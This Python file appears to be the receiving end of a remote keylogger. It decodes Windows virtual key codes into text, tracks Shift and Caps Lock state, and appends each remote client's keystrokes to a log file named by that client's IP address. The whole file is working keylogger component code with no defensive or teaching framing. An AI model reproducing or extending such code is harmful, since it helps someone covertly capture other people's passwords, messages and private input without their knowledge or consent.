

KEYCODEMAP = {
    0xa0:   "LSHIFT",
    0xa1:   "RSHIFT",
    0xa2:   "LCTRL",
    0xa3:   "RCTRL",
    0xa4:   "L_ALT",
    0xa5:   "R_ALT",
    0x10:   "SHIFT",
    
    0x14:   "CAPS_LOCK",
    0x1b:   "ESCAPE",
    0x20:   "SPACE",
    0x23:   "END",
    0x24:   "HOME",
    0x25:   "LEFT_ARROW",
    0x26:   "UP_ARROW",
    0x27:   "RIGHT_ARROW",
    0x28:   "DOWN_ARROW",
    0x29:   "SELECT",
    0x2A:   "PRINT",
    0x2D:   "INSERT",
    0x2E:   "DELETE",
    0x08:   "BACKSPACE",
    0x09:   "TAB",
    0x0D:   "ENTER",

    0x6A:   "NM_MULT",
    0x6B:   "NM_ADD",
    0x6C:   "NM_SEPARATOR",
    0x6D:   "NM_SUB",
    0x6E:   "NM_DECIMAL",
    0x6F:   "NM_DIVIDE",

    0x5B:   "LEFT_WIN",
    0x5C:   "RIGHT_WIN",
    0x5D:   "APPS"
}

KEYCODE_NUM_SHIFT = {
    0x31: '!',  # '1' -> '!'
    0x32: '@',  # '2' -> '@'
    0x33: '#',  # '3' -> '#'
    0x34: '$',  # '4' -> '$'
    0x35: '%',  # '5' -> '%'
    0x36: '^',  # '6' -> '^'
    0x37: '&',  # '7' -> '&'
    0x38: '*',  # '8' -> '*'
    0x39: '(',  # '9' -> '('
    0x30: ')',  # '0' -> ')'
}
KEYCODE_SHIFT_DEP = {
    0xBD: ['-', '_'],  # '-' -> '_'
    0xBB: ['=', '+'],  # '=' -> '+'
    0xDB: ['[', '{'],  # '[' -> '{'
    0xDD: [']', '}'],  # ']' -> '}'
    0xDC: ['\\', '|'],  # '\' -> '|'
    0xBA: [';', ':'],  # ';' -> ':'
    0xDE: ['\'', '"'],  # '\'' -> '"'
    0xBC: [',', '<'],  # ',' -> '<'
    0xBE: ['.', '>'],  # '.' -> '>'
    0xBF: ['/', '?'],  # '/' -> '?'
    0xC0: ['`', '~'],  # '`' -> '~'
}


KC_F1   =   0x70
KC_F24  =   0x87

KC_NUMPAD_0 = 0x60
KC_NUMPAD_9 = 0x69

KC_SHIFT = 0xa0
KC_CAPSLOCK = 0x14

class Client():
    
    def __init__(self, ip_addr):
        self.ip_addr= ip_addr
        self.states = {
            KC_SHIFT:       False,
            KC_CAPSLOCK:    False
        }

        self.file_handle = open(f"clients/ip-{ip_addr}.txt","a")
    
    def log_keys(self, keys):
        buffer = []

        for i in keys:

            if (i == KC_SHIFT):
                print("got shft")                
                self.states[KC_SHIFT] = not self.states[KC_SHIFT]

            elif (i == KC_CAPSLOCK):
                self.states[KC_CAPSLOCK] = not self.states[KC_CAPSLOCK]

            # A-Z
            elif(i >= 0x41 and i <= 0x5A):
                buffer.append(self.get_stateful_key(i))

            # 0-9 and shift codes
            elif(KEYCODE_NUM_SHIFT.get(i) is not None):
                if(self.states[KC_SHIFT]):
                    buffer.append(KEYCODE_NUM_SHIFT.get(i))
                else:
                    buffer.append(chr(i))
            # characters like '.' and ','
            elif(KEYCODE_SHIFT_DEP.get(i) is not None):
                if(self.states[KC_SHIFT]):
                    buffer.append(KEYCODE_SHIFT_DEP[i][1])
                else:
                    buffer.append(KEYCODE_SHIFT_DEP[i][0])
            # e.g. SPACE, TAB, BACK, etc.
            elif KEYCODEMAP.get(i) is not None:
                buffer.append(f"[{KEYCODEMAP[i]}]")
            # F keys
            elif (i >= KC_F1 and i <= KC_F24):
                buffer.append(f"[F{(i-KC_F1)+1}]")
            # numpad
            elif (i >= KC_NUMPAD_0 and i <= KC_NUMPAD_9):
                buffer.append(f"[NUMPAD_{(i-KC_NUMPAD_0)}]")

            else:
                buffer.append(f"[UNKNOWN:{i:02x}]")
       
            

        for char in buffer:
            self.file_handle.write(char)
        self.file_handle.write('\n')
        self.file_handle.flush()
        

    def get_stateful_key(self, key):

        if((self.states[KC_SHIFT] and self.states[KC_CAPSLOCK]) or
           (not self.states[KC_SHIFT] and not self.states[KC_CAPSLOCK])):
            return chr(key + 0x20)
        else:
            return chr(key)

